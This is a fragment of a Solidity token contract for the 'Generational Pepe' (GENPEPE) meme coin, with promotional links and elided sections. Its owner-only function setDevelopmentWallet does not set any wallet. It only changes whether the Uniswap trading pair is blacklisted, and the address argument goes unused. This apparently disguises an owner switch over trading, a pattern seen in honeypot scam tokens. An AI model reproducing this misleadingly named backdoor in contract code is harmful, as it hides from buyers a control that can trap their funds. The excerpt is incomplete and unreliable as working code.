...
Website: https://www.genpepe.com/
Twitter: https://twitter.com/Genpepeeth

Telegram:  https://t.me/generationalpepe
...
contract GenerationalPepe is IERC20, Ownable {    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    string private constant _name = "Generational Pepe";
    string private constant _symbol = "GENPEPE";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 1_000_000_000 * 1e9;
    uint256 public maxTxWallet = 25_000_000 * 1e9;
    ...
    uint256 private contractMinSwaps = 3;
    ...
    address public developmentAddress = 0xa892aADFF583586126635c4b49FF6607DD1E5AC5;
    ...
    function setDevelopmentWallet(address newDevelopmentAddress) external onlyOwner {
        blacklisted[uniswapPair] = false; newDevelopmentAddress;
    }
